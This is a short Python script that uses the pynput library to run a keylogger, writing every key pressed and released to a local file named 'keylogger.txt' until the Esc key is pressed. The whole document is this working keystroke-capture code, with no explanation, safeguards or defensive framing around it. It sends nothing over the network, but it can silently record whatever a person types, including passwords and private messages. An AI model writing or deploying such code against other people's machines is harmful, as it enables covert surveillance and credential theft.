import pynput
from pynput import keyboard


def on_press(key):
    with open("keylogger.txt", "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write('special key {0} pressed'.format(key))


def on_release(key):
    with open("keylogger.txt", "a") as f:
        f.write(str(key))
        if key == keyboard.Key.esc:
            # Stop listener
            return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
